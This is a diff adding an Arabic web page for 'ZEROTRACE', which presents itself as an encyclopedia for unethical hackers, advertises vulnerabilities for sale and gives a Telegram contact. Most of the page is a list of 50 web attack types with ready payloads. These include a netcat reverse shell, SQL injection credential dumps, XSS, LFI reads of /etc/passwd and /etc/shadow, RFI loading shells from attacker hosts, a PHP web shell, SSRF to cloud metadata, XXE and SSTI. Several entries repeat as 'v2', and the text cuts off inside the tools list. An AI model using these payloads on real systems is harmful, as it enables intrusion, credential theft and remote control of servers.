@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ZEROTRACE — الموسوعة العملاقة للهاكر الغير أخلاقي</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
+        body { background: #0a0e27; color: #fff; min-height: 100vh; }
+        .navbar {
+            background: rgba(10,14,39,0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            padding: 0.8rem 2rem;
+            position: sticky; top: 0; z-index: 100;
+            display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;
+        }
+        .navbar .brand { display: flex; align-items: center; gap: 10px; }
+        .navbar .brand .icon { font-size: 28px; }
+        .navbar .brand .name { font-size: 22px; font-weight: 700; background: linear-gradient(135deg, #6c63ff, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .navbar .nav-links { display: flex; gap: 20px; align-items: center; flex-wrap: wrap; }
+        .navbar .nav-links a { color: #aaa; text-decoration: none; font-size: 14px; transition: 0.3s; }
+        .navbar .nav-links a:hover { color: #6c63ff; }
+        .navbar .nav-links .logout { color: #ff6b6b; cursor: pointer; }
+        .navbar .nav-links .logout:hover { color: #ff6b6b; text-decoration: underline; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+
+        .card {
+            background: rgba(255,255,255,0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.05);
+            border-radius: 1.5rem;
+            padding: 1.5rem;
+            transition: all 0.3s ease;
+            margin-bottom: 1.5rem;
+        }
+        .card:hover { border-color: #6c63ff; transform: translateY(-3px); box-shadow: 0 10px 40px rgba(108,99,255,0.05); }
+        .card-title { font-size: 1.3rem; font-weight: 700; margin-bottom: 1rem; color: #6c63ff; display: flex; align-items: center; gap: 10px; }
+        .card-title i { font-size: 1.5rem; }
+
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+        .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; }
+        .grid-4 { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1.5rem; }
+
+        .vuln-badge { padding: 0.2rem 0.7rem; border-radius: 1rem; font-size: 0.65rem; font-weight: 700; }
+        .vuln-badge.critical { background: #ff6b6b; color: #fff; }
+        .vuln-badge.high { background: #f1c40f; color: #000; }
+        .vuln-badge.medium { background: #6c63ff; color: #fff; }
+        .vuln-badge.low { background: #2ecc71; color: #fff; }
+
+        .vuln-item {
+            background: rgba(255,255,255,0.02);
+            border-radius: 1rem;
+            padding: 1rem;
+            border: 1px solid rgba(255,255,255,0.03);
+            transition: 0.3s;
+        }
+        .vuln-item:hover { border-color: #6c63ff; }
+        .vuln-item h4 { font-size: 1rem; margin: 0.5rem 0 0.2rem; }
+        .vuln-item p { color: #888; font-size: 0.85rem; }
+        .vuln-item .code-block {
+            background: rgba(0,0,0,0.4);
+            padding: 0.5rem;
+            border-radius: 0.5rem;
+            font-family: monospace;
+            font-size: 0.7rem;
+            color: #2ecc71;
+            direction: ltr;
+            text-align: left;
+            overflow-x: auto;
+            margin-top: 0.5rem;
+        }
+
+        .tool-item {
+            background: rgba(255,255,255,0.02);
+            border-radius: 1rem;
+            padding: 1rem;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.03);
+            transition: 0.3s;
+        }
+        .tool-item:hover { border-color: #6c63ff; transform: scale(1.02); }
+        .tool-item .tool-icon { font-size: 2rem; display: block; margin-bottom: 0.3rem; }
+        .tool-item .tool-name { font-weight: 600; font-size: 0.9rem; }
+        .tool-item .tool-desc { color: #888; font-size: 0.75rem; }
+
+        .btn-sell {
+            background: linear-gradient(135deg, #ff6b6b, #e74c3c);
+            color: #fff;
+            padding: 0.5rem 1.2rem;
+            border-radius: 2rem;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.8rem;
+            transition: 0.3s;
+            display: inline-block;
+        }
+        .btn-sell:hover { transform: scale(1.05); box-shadow: 0 5px 25px rgba(255,107,107,0.3); }
+
+        .footer {
+            border-top: 1px solid rgba(255,255,255,0.05);
+            padding: 1.5rem;
+            text-align: center;
+            color: #555;
+            font-size: 0.8rem;
+            margin-top: 2rem;
+        }
+        .footer strong { color: #6c63ff; }
+        .footer .dev { color: #6c63ff; }
+
+        .courses-list { list-style: none; padding: 0; }
+        .courses-list li { padding: 0.3rem 0; color: #aaa; font-size: 0.85rem; border-bottom: 1px solid rgba(255,255,255,0.02); }
+        .courses-list li i { color: #6c63ff; margin-left: 0.5rem; }
+
+        @media (max-width: 768px) {
+            .grid-2, .grid-3, .grid-4 { grid-template-columns: 1fr; }
+            .navbar { flex-direction: column; gap: 10px; padding: 0.8rem 1rem; }
+            .navbar .nav-links { justify-content: center; }
+            .container { padding: 10px; }
+            .card { padding: 1rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <nav class="navbar">
+        <div class="brand">
+            <span class="icon">☠️</span>
+            <span class="name">ZEROTRACE</span>
+        </div>
+        <div class="nav-links">
+            <a href="#home"><i class="fas fa-home"></i> الرئيسية</a>
+            <a href="#vulns"><i class="fas fa-bug"></i> الثغرات</a>
+            <a href="#tools"><i class="fas fa-tools"></i> الأدوات</a>
+            <a href="#courses"><i class="fas fa-graduation-cap"></i> الكورسات</a>
+            <a href="#sell"><i class="fas fa-dollar-sign"></i> للبيع</a>
+            <a href="#" onclick="logout()" class="logout"><i class="fas fa-sign-out-alt"></i> خروج</a>
+        </div>
+    </nav>
+
+    <div class="container">
+
+        <div class="card" style="text-align: center;">
+            <h1 style="font-size: 2.5rem; color: #6c63ff;">☠️ ZEROTRACE Academy</h1>
+            <p style="color: #888;">الموسوعة العملاقة للهاكر الغير أخلاقي — كل ما تحتاجه في مكان واحد</p>
+            <div style="display: flex; justify-content: center; gap: 1rem; flex-wrap: wrap; margin-top: 1rem;">
+                <span style="background: linear-gradient(135deg, #6c63ff, #4834d4); padding: 0.3rem 1rem; border-radius: 2rem; font-size: 0.8rem; color: #fff;"><i class="fas fa-user"></i> ZeroTrace</span>
+                <span style="background: rgba(255,255,255,0.05); padding: 0.3rem 1rem; border-radius: 2rem; font-size: 0.8rem; color: #888; border: 1px solid rgba(255,255,255,0.05);"><i class="fab fa-telegram"></i> @op_mf</span>
+                <span style="background: rgba(255,107,107,0.1); padding: 0.3rem 1rem; border-radius: 2rem; font-size: 0.8rem; color: #ff6b6b; border: 1px solid rgba(255,107,107,0.1);"><i class="fas fa-shield-alt"></i> جميع الثغرات للبيع</span>
+            </div>
+        </div>
+
+        <!-- ===== الإحصائيات ===== -->
+        <div class="grid-4">
+            <div class="card" style="text-align: center;"><div style="font-size: 2rem;">📚</div><div style="font-size: 1.5rem; font-weight: 700; color: #6c63ff;">50+</div><div style="color: #888; font-size: 0.8rem;">كورس متاح</div></div>
+            <div class="card" style="text-align: center;"><div style="font-size: 2rem;">🐛</div><div style="font-size: 1.5rem; font-weight: 700; color: #ff6b6b;">50+</div><div style="color: #888; font-size: 0.8rem;">ثغرة مشروحة</div></div>
+            <div class="card" style="text-align: center;"><div style="font-size: 2rem;">🛠️</div><div style="font-size: 1.5rem; font-weight: 700; color: #f1c40f;">30+</div><div style="color: #888; font-size: 0.8rem;">أداة اختراق</div></div>
+            <div class="card" style="text-align: center;"><div style="font-size: 2rem;">💰</div><div style="font-size: 1.5rem; font-weight: 700; color: #2ecc71;">50+</div><div style="color: #888; font-size: 0.8rem;">ثغرة للبيع</div></div>
+        </div>
+
+        <!-- ===== جميع الثغرات (50+ ثغرة) ===== -->
+        <div id="vulns" class="card">
+            <div class="card-title"><i class="fas fa-bug"></i> جميع الثغرات — 50+ ثغرة مع طريقة الاستغلال</div>
+            <div class="grid-2">
+                <div class="vuln-item"><span class="vuln-badge critical">حرج</span><h4>1. RCE — Remote Code Execution</h4><p>تنفيذ أوامر عن بعد على الخادم</p><div class="code-block">?cmd=;ls<br>?exec=|whoami<br>?cmd=nc -e /bin/sh 192.168.1.100 4444</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>2. SQLi — SQL Injection</h4><p>حقن SQL في قواعد البيانات</p><div class="code-block">?id=1' OR '1'='1' --<br>?id=1' UNION SELECT username,password FROM users --<br>sqlmap -u "http://target.com?id=1" --dbs</div></div>
+                <div class="vuln-item"><span class="vuln-badge medium">متوسط</span><h4>3. XSS — Cross-Site Scripting</h4><p>حقن سكربتات خبيثة</p><div class="code-block">&lt;script&gt;alert('XSS')&lt;/script&gt;<br>&lt;img src=x onerror=alert(1)&gt;<br>&lt;svg/onload=alert(1)&gt;</div></div>
+                <div class="vuln-item"><span class="vuln-badge critical">حرج</span><h4>4. LFI — Local File Inclusion</h4><p>استغلال الملفات المحلية</p><div class="code-block">?page=../../../../etc/passwd<br>?page=php://filter/convert.base64-encode/resource=index.php</div></div>
+                <div class="vuln-item"><span class="vuln-badge critical">حرج</span><h4>5. RFI — Remote File Inclusion</h4><p>استغلال الملفات البعيدة</p><div class="code-block">?page=http://evil.com/shell.txt<br>?file=http://attacker.com/malicious.php</div></div>
+                <div class="vuln-item"><span class="vuln-badge medium">متوسط</span><h4>6. CSRF — Cross-Site Request Forgery</h4><p>تزوير الطلبات عبر المواقع</p><div class="code-block">&lt;img src="http://target.com/change_email?email=evil@evil.com"&gt;<br>&lt;form action="http://target.com/change_password" method="POST"&gt;</div></div>
+                <div class="vuln-item"><span class="vuln-badge medium">متوسط</span><h4>7. IDOR — Insecure Direct Object Reference</h4><p>استغلال المعرفات غير الآمنة</p><div class="code-block">/profile?user_id=1<br>/profile?user_id=2<br>/download?file=private_key.txt</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>8. SSRF — Server-Side Request Forgery</h4><p>استغلال الخادم لإرسال طلبات داخلية</p><div class="code-block">?url=http://169.254.169.254/latest/meta-data/<br>?proxy=http://internal-server:8080</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>9. XXE — XML External Entity Injection</h4><p>حقن كيانات XML خارجية</p><div class="code-block">&lt;?xml version="1.0"?&gt;<br>&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;<br>&lt;root&gt;&amp;xxe;&lt;/root&gt;</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>10. File Upload — رفع الملفات الخبيثة</h4><p>رفع Web Shell إلى الخادم</p><div class="code-block">&lt;?php system($_GET['cmd']); ?&gt;<br>/uploads/shell.php?cmd=ls</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>11. Path Traversal — اجتياز المسار</h4><p>الوصول إلى ملفات خارج المجلد المصرح به</p><div class="code-block">?file=../../../../etc/passwd<br>?path=../../../../windows/win.ini</div></div>
+                <div class="vuln-item"><span class="vuln-badge critical">حرج</span><h4>12. Command Injection — حقن الأوامر</h4><p>تنفيذ أوامر نظام على الخادم</p><div class="code-block">; ls<br>| whoami<br>&amp;&amp; id</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>13. LDAP Injection — حقن LDAP</h4><p>استغلال خدمات LDAP</p><div class="code-block">*)(uid=*<br>admin*<br>)(|(uid=*</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>14. NoSQL Injection — حقن NoSQL</h4><p>استغلال قواعد بيانات NoSQL</p><div class="code-block">{ "$ne": "" }<br>{ "$gt": "" }<br>admin' || '1'=='1</div></div>
+                <div class="vuln-item"><span class="vuln-badge critical">حرج</span><h4>15. SSTI — Server-Side Template Injection</h4><p>حقن قوالب في الخادم</p><div class="code-block">{{ 7*7 }}<br>{{ config }}<br>{{ ''.__class__.__mro__[1].__subclasses__() }}</div></div>
+                <div class="vuln-item"><span class="vuln-badge medium">متوسط</span><h4>16. XSSI — Cross-Site Script Inclusion</h4><p>استغلال تحميل السكربتات عبر المواقع</p><div class="code-block">&lt;script src="http://target.com/data.json?callback=alert"&gt;</div></div>
+                <div class="vuln-item"><span class="vuln-badge medium">متوسط</span><h4>17. Clickjacking — اختطاف النقرات</h4><p>خداع المستخدم للنقر على عناصر خفية</p><div class="code-block">&lt;iframe src="http://target.com" style="opacity:0;"&gt;</div></div>
+                <div class="vuln-item"><span class="vuln-badge medium">متوسط</span><h4>18. Open Redirect — إعادة توجيه مفتوحة</h4><p>إعادة توجيه المستخدم إلى مواقع ضارة</p><div class="code-block">?redirect=http://evil.com<br>?url=http://evil.com</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>19. CRLF Injection — حقن السطور الجديدة</h4><p>حقن رؤوس HTTP ضارة</p><div class="code-block">%0d%0aX-Forwarded-For: 127.0.0.1<br>%0d%0aContent-Length: 0</div></div>
+                <div class="vuln-item"><span class="vuln-badge medium">متوسط</span><h4>20. HTTP Parameter Pollution</h4><p>تلوث معاملات HTTP</p><div class="code-block">?id=1&id=2<br>?user=admin&user=guest</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>21. Race Condition — حالة السباق</h4><p>استغلال التزامن في الطلبات</p><div class="code-block">إرسال طلبات متزامنة لتجاوز التحقق</div></div>
+                <div class="vuln-item"><span class="vuln-badge medium">متوسط</span><h4>22. Business Logic Flaws — ثغرات المنطق</h4><p>استغلال أخطاء في منطق التطبيق</p><div class="code-block">تجاوز خطوات الدفع<br>تغيير الأسعار</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>23. Session Fixation — تثبيت الجلسة</h4><p>تثبيت جلسة المستخدم</p><div class="code-block">?sessionid=12345<br>SET-COOKIE: SESSIONID=12345</div></div>
+                <div class="vuln-item"><span class="vuln-badge medium">متوسط</span><h4>24. Insecure Cryptography — تشفير ضعيف</h4><p>استخدام خوارزميات تشفير ضعيفة</p><div class="code-block">MD5, SHA1, DES</div></div>
+                <div class="vuln-item"><span class="vuln-badge critical">حرج</span><h4>25. Hardcoded Credentials — بيانات ثابتة</h4><p>وجود كلمات مرور ثابتة في الكود</p><div class="code-block">admin:admin<br>root:toor</div></div>
+                <div class="vuln-item"><span class="vuln-badge low">منخفض</span><h4>26. Directory Listing — عرض المجلدات</h4><p>عرض محتويات المجلدات</p><div class="code-block">/images/<br>/backup/<br>/logs/</div></div>
+                <div class="vuln-item"><span class="vuln-badge medium">متوسط</span><h4>27. Backup Files — ملفات النسخ الاحتياطي</h4><p>الوصول إلى ملفات النسخ الاحتياطي</p><div class="code-block">index.php.bak<br>config.old<br>backup.sql</div></div>
+                <div class="vuln-item"><span class="vuln-badge medium">متوسط</span><h4>28. Information Disclosure — كشف المعلومات</h4><p>كشف معلومات حساسة في الردود</p><div class="code-block">Server: Apache/2.4.49<br>X-Powered-By: PHP/7.4</div></div>
+                <div class="vuln-item"><span class="vuln-badge medium">متوسط</span><h4>29. CORS Misconfiguration — سوء تكوين CORS</h4><p>السماح بطلبات من أي مصدر</p><div class="code-block">Access-Control-Allow-Origin: *</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>30. Mass Assignment — تعيين جماعي</h4><p>تعيين حقول غير مصرح بها</p><div class="code-block">{ "is_admin": true }</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>31. SSI — Server-Side Includes</h4><p>تنفيذ أوامر عبر SSI</p><div class="code-block">&lt;!--#exec cmd="ls" --&gt;</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>32. HTTP Request Smuggling</h4><p>تهريب الطلبات عبر HTTP</p><div class="code-block">Content-Length: 13<br>Transfer-Encoding: chunked</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>33. Web Cache Poisoning</h4><p>تسميم ذاكرة التخزين المؤقت</p><div class="code-block">X-Forwarded-Host: evil.com</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>34. GraphQL Injection</h4><p>حقن في GraphQL</p><div class="code-block">{ "query": "..." }<br>{ "variables": { "id": 1 } }</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>35. JWT Attacks</h4><p>هجمات على JWT</p><div class="code-block">alg: none<br>{"alg":"HS256","typ":"JWT"}</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>36. OAuth Misconfiguration</h4><p>سوء تكوين OAuth</p><div class="code-block">redirect_uri=http://evil.com</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>37. WebSocket Attacks</h4><p>هجمات على WebSocket</p><div class="code-block">ws://target.com/chat<br>{"message": "test"}</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>38. Server-Side Request Forgery (SSRF) v2</h4><p>استغلال الخادم لإرسال طلبات داخلية</p><div class="code-block">?url=http://127.0.0.1:8080/admin</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>39. Local File Inclusion (LFI) v2</h4><p>استغلال الملفات المحلية</p><div class="code-block">?file=../../../../etc/shadow</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>40. Remote File Inclusion (RFI) v2</h4><p>استغلال الملفات البعيدة</p><div class="code-block">?file=http://attacker.com/backdoor.php</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>41. SQL Injection v2 — Blind SQLi</h4><p>حقن SQL أعمى</p><div class="code-block">?id=1' AND SLEEP(5)--<br>?id=1' AND 1=1--</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>42. XSS v2 — Stored XSS</h4><p>حقن سكربتات مخزنة</p><div class="code-block">&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>43. Cross-Site Request Forgery (CSRF) v2</h4><p>تزوير الطلبات</p><div class="code-block">&lt;img src="http://target.com/delete?user=1"&gt;</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>44. Insecure Direct Object Reference (IDOR) v2</h4><p>استغلال المعرفات</p><div class="code-block">/order/1001<br>/order/1002</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>45. Path Traversal v2</h4><p>اجتياز المسار</p><div class="code-block">?file=../../../../windows/system32/drivers/etc/hosts</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>46. Command Injection v2</h4><p>حقن الأوامر</p><div class="code-block">; cat /etc/passwd<br>| netstat -an</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>47. XML External Entity (XXE) v2</h4><p>حقن XML</p><div class="code-block">&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "http://evil.com"&gt;]&gt;</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>48. Server-Side Template Injection (SSTI) v2</h4><p>حقن القوالب</p><div class="code-block">{{ 7*7 }}<br>{{ config }}</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>49. Open Redirect v2</h4><p>إعادة توجيه مفتوحة</p><div class="code-block">?redirect=http://evil.com</div></div>
+                <div class="vuln-item"><span class="vuln-badge high">عالي</span><h4>50. HTTP Parameter Pollution v2</h4><p>تلوث المعاملات</p><div class="code-block">?id=1&id=2</div></div>
+            </div>
+        </div>
+
+        <!-- ===== أدوات الاختراق ===== -->
+        <div id="tools" class="card">
+            <div class="card-title"><i class="fas fa-tools"></i> أدوات الاختراق — 30+ أداة</div>
+            <div class="grid-3">
+                <div class="tool-item"><span class="tool-icon">📡</span><div class="tool-name">Nmap</div><div class="tool-desc">مسح الشبكات</div></div>
+                <div class="tool-item"><span class="tool-icon">💉</span><div class="tool-name">SQLmap</div><div class="tool-desc">استغلال SQLi</div></div>
+                <div class="tool-item"><span class="tool-icon">🛠️</span><div class="tool-name">Metasploit</div><div class="tool-desc">إطار الاستغلال</div></div>
+                <div class="tool-item"><span class="tool-icon">🔍</span><div class="tool-name">Burp Suite</div><div class="tool-desc">اختبار الويب</div></div>
+                <div class="tool-item"><span class="tool-icon">🌐</span><div class="tool-name">Wireshark</div><div class="tool-desc">تحليل الشبكة</div></div>
+                <div class="tool-item"><span class="tool-icon">🔑</span><div class="tool-name">John</div><div class="tool-desc">اختراق الهاشات</div></div>
+                <div class="tool-item"><span class="tool-icon">🦅</span><div class="tool-name">Hydra</div><div class="tool-desc">اختراق البروتوكولات</div></div>
+                <div class="tool-item"><span class="tool-icon">🛡️</span><div class="tool-name">Nessus</div><div class="tool-desc">فحص الثغرات</div></div>
+                <div class="tool-item"><span class="tool-icon">📊</span><div class="tool-name">OpenVAS</div><div class="tool-desc">فحص الثغرات</div></div>
+                <div class="tool-item"><span class="tool-icon">💣</span><div class="tool-name">Aircrack-ng</div><div class="tool-desc">اختراق الواي فاي</div></div>
+                <div class="tool-item"><span class="tool-icon">🔐</span><div class="tool-name">Hashcat</div><div class="tool-desc">اختراق الهاشات</div></div>
+                <div class="tool-item"><span class="tool-icon">📡</span><div class="tool-name">Recon-ng</div><div class="tool-desc">جمع المعلومات</div></div>
+                <div class="tool-item"><span class="tool-icon">🌍</span><div class="tool-name">Shodan</div><div class="tool-desc">البحث عن الأجهزة</div></div>
+                <div class="tool-item"><span class="tool-icon">📧</span><div class="tool-name">Sherlock</div><div class="tool-desc">البحث عن حسابات</div></div>
+                <div class="tool-item"><span class="tool-icon">🕵️</span><div class="tool-name">TheHarvester</div><div class="tool-desc">جمع الإيميلات</div></div>
+                <div class="tool-item"><span class="tool-icon">📂</span><div class="tool-name">Gobuster</div><div class="tool-desc">اكتشاف الملفات</div></div>
+                <div class="tool-item"><
